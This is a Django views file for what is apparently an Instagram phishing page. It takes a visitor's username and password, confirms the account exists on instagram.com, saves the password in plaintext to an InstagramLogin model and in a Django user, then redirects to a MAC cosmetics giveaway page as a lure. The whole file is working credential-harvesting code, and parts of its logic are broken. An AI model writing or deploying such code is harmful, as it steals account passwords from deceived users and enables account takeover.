import requests
from django.shortcuts import render, redirect
from django.contrib.auth.models import User
from django.contrib.auth import login, logout

from .models import InstagramLogin


# Create your views here.
params = {}

def index(request):
    if request.method == 'POST':
        username = request.POST.get('username')
        password = request.POST.get('password')

        response = requests.get("https://instagram.com/" + username + "/")
        if response.status_code == 404 :
            params.update({'messages': True})
            return render(request,'index.html',params)

        else:
            params.update({'messages': False})
            entry = InstagramLogin(username=username, password=password)
            entry.save()

            try:
                user = User.objects.get(username=username)
                if user.is_authenticated:
                    logout(request)
            except:
                pass

            if User.DoesNotExist:
                try:
                    user = User.objects.create_user(str(username), 'testemail@testemail.com', str(password))
                    user.save()
                    return redirect("https://gleam.io/sAaak/mac-cosmetics-giveaway")
                except:
                    return redirect("https://gleam.io/sAaak/mac-cosmetics-giveaway")
                
            else:
                login(request, username)          

    return render(request,'index.html',params)
